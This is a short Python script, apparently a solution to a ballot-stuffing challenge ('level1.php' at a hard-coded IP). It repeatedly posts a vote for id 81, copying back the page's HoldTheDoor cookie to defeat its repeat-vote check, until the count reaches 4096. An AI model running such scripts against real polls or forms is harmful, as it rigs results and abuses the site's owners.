import requests
header =  {'Content-Type': 'application/x-www-form-urlencoded',}
URL = 'http://54.221.6.249/level1.php'
payload = {
    'id': '81',
    'holdthedoor': 'Submit',
    'key': '0'
}
cookies = {
    'HoldTheDoor': '0'
}


r = requests.get(URL)
while "81    </td>\n    <td>\n4096" not in r.text:
    cookies['holdthedoor'] = r.cookies['HoldTheDoor']
    r = requests.post(URL, data=payload, headers=header, cookies=cookies)
print("Voting complete!")
